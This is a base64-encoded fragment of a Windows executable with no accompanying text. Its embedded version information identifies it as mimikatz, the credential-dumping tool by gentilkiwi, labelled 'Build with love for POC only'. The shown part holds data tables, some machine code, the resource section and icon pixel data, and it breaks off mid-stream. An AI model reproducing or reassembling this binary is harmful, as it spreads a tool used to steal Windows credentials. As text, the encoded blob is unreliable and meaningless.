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wAZAAgAHcAaQB0AGgAIABsAG8AdgBlACAAZgBvAHIAIABQAE8AQwAgAG8AbgBsAHkAAAAAADwADgABAFMAcABlAGMAaQBhAGwAQgB1AGkAbABkAAAAawBpAHcAaQAgAGYAbABhAHYAbwByACAAIQAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAJBLAEKAAAADAAAABgAAAAAQAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABU/YgAKBQEACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLABZCZwAKBgMACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAkDAAALCgkACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwILCwsECwsLCQsLCw4LCwsTCwsLFwsLCxoLCwsXCwsLEwsLCw0LCwsFCwsLAgsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsKCQALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwALCwsACwsLAAsLCwcLCwsWCwsLJwsLCzgLCQk/CwkHRQsJB00LCQdZCwkHZAsJCXALCw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